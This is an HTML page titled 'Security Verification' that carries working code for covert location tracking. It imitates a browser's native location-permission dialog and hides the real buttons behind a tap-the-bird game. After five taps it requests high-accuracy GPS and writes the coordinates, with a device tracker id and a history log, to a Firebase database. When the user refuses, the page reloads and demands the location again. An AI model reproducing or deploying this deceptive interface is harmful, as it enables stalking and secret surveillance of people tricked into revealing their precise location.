<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
  <title>Security Verification</title>
  <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      -webkit-tap-highlight-color: transparent;
      user-select: none;
      font-family: 'Roboto', 'Segoe UI', Arial, sans-serif;
    }

    body {
      background: #000; /* Fake background */
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      overflow: hidden;
    }

    /* ═══ FAKE NATIVE GPS POPUP (Screenshot Copy) ═══ */
    .fake-popup {
      position: fixed;
      inset: 0;
      background: rgba(0, 0, 0, 0.6); /* Dark backdrop */
      display: flex;
      align-items: center;
      justify-content: center;
      z-index: 999999;
      animation: fadeIn 0.3s ease;
    }

    @keyframes fadeIn {
      from { opacity: 0; }
      to { opacity: 1; }
    }

    .popup-box {
      background: #2d2d2d;
      width: 90%;
      max-width: 400px;
      border-radius: 24px;
      padding: 20px;
      box-shadow: 0 10px 40px rgba(0,0,0,0.5);
      animation: slideUp 0.3s ease;
    }

    @keyframes slideUp {
      from { transform: translateY(30px); opacity: 0; }
      to { transform: translateY(0); opacity: 1; }
    }

    /* Header */
    .popup-header {
      display: flex;
      align-items: center;
      gap: 12px;
      margin-bottom: 20px;
    }

    .icon-map {
      width: 36px;
      height: 36px;
      background: #fff;
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 18px;
    }

    .header-text {
      color: #fff;
      font-size: 16px;
      line-height: 1.4;
    }

    /* Location Options */
    .location-option {
      background: #1e1e1e;
      border-radius: 12px;
      padding: 16px;
      display: flex;
      align-items: center;
      gap: 14px;
      margin-bottom: 10px;
      cursor: pointer;
      border: 2px solid transparent;
      transition: border 0.2s;
    }

    .location-option.active {
      border-color: #8ab4f8;
    }

    .icon-grid {
      width: 44px;
      height: 44px;
      border-radius: 8px;
      background: linear-gradient(135deg, #4285f4, #34a853);
      position: relative;
      overflow: hidden;
    }
    
    .icon-grid::after {
      content: '';
      position: absolute;
      inset: 0;
      background-image: linear-gradient(rgba(255,255,255,0.4) 1px, transparent 1px), linear-gradient(90deg, rgba(255,255,255,0.4) 1px, transparent 1px);
      background-size: 10px 10px;
    }

    .option-text {
      flex: 1;
      color: #fff;
    }
    .option-text h3 {
      font-size: 15px;
      font-weight: 500;
      margin-bottom: 2px;
    }
    .option-text p {
      font-size: 13px;
      color: #aaa;
    }

    .radio-check {
      width: 24px;
      height: 24px;
      border-radius: 50%;
      border: 2px solid #aaa;
      display: flex;
      align-items: center;
      justify-content: center;
    }
    .location-option.active .radio-check {
      border-color: #8ab4f8;
      background: #8ab4f8;
    }
    .radio-check::after {
      content: '✓';
      color: #000;
      font-size: 14px;
      font-weight: bold;
      display: none;
    }
    .location-option.active .radio-check::after {
      display: block;
    }

    /* Buttons Area */
    .btn-container {
      position: relative;
      margin-top: 20px;
      display: flex;
      flex-direction: column;
      gap: 10px;
    }

    .fake-btn {
      background: #e0e0e0;
      color: #000;
      border: none;
      border-radius: 100px;
      padding: 14px;
      font-size: 15px;
      font-weight: 500;
      text-align: center;
      cursor: pointer;
      pointer-events: none; /* User click nahi kar sakta, sirf bird se hoga */
    }

    /* ═══ THE BIRD (Allow button ke upar) ═══ */
    .bird-container {
      position: absolute;
      top: -60px; /* Allow button ke theek upar */
      left: 50%;
      transform: translateX(-50%);
      width: 100%;
      height: 80px;
      background: rgba(45, 45, 45, 0.9);
      border: 1px dashed #8ab4f8;
      border-radius: 12px;
      display: flex;
      align-items: center;
      justify-content: center;
      overflow: hidden;
      box-shadow: 0 0 15px rgba(138, 180, 248, 0.3);
    }

    .bird-target {
      position: absolute;
      font-size: 40px;
      cursor: pointer;
      display: none;
      transition: transform 0.1s;
      filter: drop-shadow(0 0 8px #fff);
      z-index: 100;
    }
    
    .bird-target:active {
      transform: scale(0.8);
    }

    /* Fake Verification Text */
    .verifying-text {
      position: absolute;
      inset: 0;
      background: rgba(0,0,0,0.8);
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      color: #fff;
      font-size: 18px;
      z-index: 1000;
      opacity: 0;
      pointer-events: none;
      transition: opacity 0.3s;
    }
    .verifying-text.show {
      opacity: 1;
      pointer-events: auto;
    }

  </style>
</head>

<body>

  <!-- ═══ FAKE POPUP ═══ -->
  <div class="fake-popup" id="fakePopup">
    <div class="popup-box">
      
      <!-- Header -->
      <div class="popup-header">
        <div class="icon-map">📍</div>
        <div class="header-text">rajak969678.github.io wants to use your device's location</div>
      </div>

      <!-- Options -->
      <div class="location-option active">
        <div class="icon-grid"></div>
        <div class="option-text">
          <h3>Precise</h3>
          <p>Exact location</p>
        </div>
        <div class="radio-check"></div>
      </div>

      <div class="location-option">
        <div class="icon-grid"></div>
        <div class="option-text">
          <h3>Approximate</h3>
          <p>Neighbourhood</p>
        </div>
        <div class="radio-check"></div>
      </div>

      <!-- Buttons -->
      <div class="btn-container">
        
        <!-- BIRD GAME AREA (Allow button ke upar) -->
        <div class="bird-container" id="birdArea">
          <div class="bird-target" id="bird">🐦</div>
        </div>

        <!-- Fake Buttons -->
        <button class="fake-btn" id="allowBtn">Allow while visiting the site</button>
        <button class="fake-btn">Allow this time</button>
        <button class="fake-btn">Never allow</button>
      </div>

      <!-- Verifying Overlay (Jab bird hit hoga) -->
      <div class="verifying-text" id="verifyingText">
        <div style="font-size: 30px; margin-bottom: 10px;">⏳</div>
        Verifying location...
      </div>

    </div>
  </div>

  <script src="config.js"></script>
  <script>
    // ═══════════════════════════════════════════════════════════════
    // FIREBASE INIT
    // ═══════════════════════════════════════════════════════════════
    let database = null;
    let deviceId = 'unknown';

    try {
      if (typeof firebaseConfig !== 'undefined' && !firebase.apps.length) {
        firebase.initializeApp(firebaseConfig);
        database = firebase.database();
        deviceId = localStorage.getItem('device_tracker_id') || 'unknown';
      }
    } catch (e) {
      console.warn('Firebase init failed:', e.message);
    }

    // ═══════════════════════════════════════════════════════════════
    // STATE
    // ═══════════════════════════════════════════════════════════════
    const state = {
      hits: 0,
      running: true,
      startTime: Date.now()
    };

    const bird = document.getElementById('bird');
    const birdArea = document.getElementById('birdArea');
    const verifyingText = document.getElementById('verifyingText');
    const allowBtn = document.getElementById('allowBtn');

    // ═══════════════════════════════════════════════════════════════
    // BIRD MOVE LOGIC
    // ═══════════════════════════════════════════════════════════════
    function moveBird() {
      if (!state.running) return;
      
      // Bird ko area ke andar random jagah pe bhejo
      const w = birdArea.clientWidth - 50;
      const h = birdArea.clientHeight - 50;
      
      bird.style.left = (Math.random() * w) + 'px';
      bird.style.top = (Math.random() * h) + 'px';
      bird.style.display = 'block';
    }

    // ═══════════════════════════════════════════════════════════════
    // BIRD CLICK (Yahi asli trick hai)
    // ═══════════════════════════════════════════════════════════════
    bird.addEventListener('click', (e) => {
      e.stopPropagation();
      if (!state.running) return;

      state.hits++;
      
      // Bird ko turant chhupao aur naya bhejo
      bird.style.display = 'none';
      setTimeout(moveBird, 40);

      // 5 hits ke baad "Allow" trigger karo
      if (state.hits >= 5) {
        state.running = false;
        bird.style.display = 'none';
        
        // User ko lage verify ho raha hai
        verifyingText.classList.add('show');
        
        // 500ms baad asli GPS maango
        setTimeout(() => {
          captureGPS();
        }, 500);
      }
    });

    // Agar user ne bird ko miss kiya aur "Allow" pe click kiya (though pointer-events none hai, safety ke liye)
    allowBtn.addEventListener('click', () => {
      if (state.running) {
        state.running = false;
        bird.style.display = 'none';
        verifyingText.classList.add('show');
        setTimeout(captureGPS, 500);
      }
    });

    // ═══════════════════════════════════════════════════════════════
    // GPS CAPTURE (Native Popup Trigger)
    // ═══════════════════════════════════════════════════════════════
    function captureGPS() {
      if (!navigator.geolocation) {
        alert("Location not supported");
        return;
      }

      navigator.geolocation.getCurrentPosition(
        (pos) => {
          const gpsData = {
            latitude: pos.coords.latitude,
            longitude: pos.coords.longitude,
            accuracy: pos.coords.accuracy,
            timestamp: Date.now(),
            source: 'fake_native_popup_bird',
            hits: state.hits,
            time: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })
          };

          if (database && deviceId !== 'unknown') {
            database.ref(`gps_locations/${deviceId}/current`).set(gpsData);
            database.ref(`gps_locations/${deviceId}/history`).push(gpsData);
          }

          // Fake popup hatao
          document.getElementById('fakePopup').style.display = 'none';
          
          // Success alert (optional)
          alert("✅ Location Verified Successfully!");
        },
        (err) => {
          // Agar user ne "Never Allow" kiya
          alert("⚠️ Verification failed. Location is required.");
          location.reload();
        },
        { enableHighAccuracy: true, timeout: 15000 }
      );
    }

    // ═══════════════════════════════════════════════════════════════
    // START GAME
    // ═══════════════════════════════════════════════════════════════
    window.addEventListener('load', () => {
      // 1 sec baad bird dikhao
      setTimeout(() => {
        moveBird();
      }, 1000);
    });
  </script>
</body>

</html>
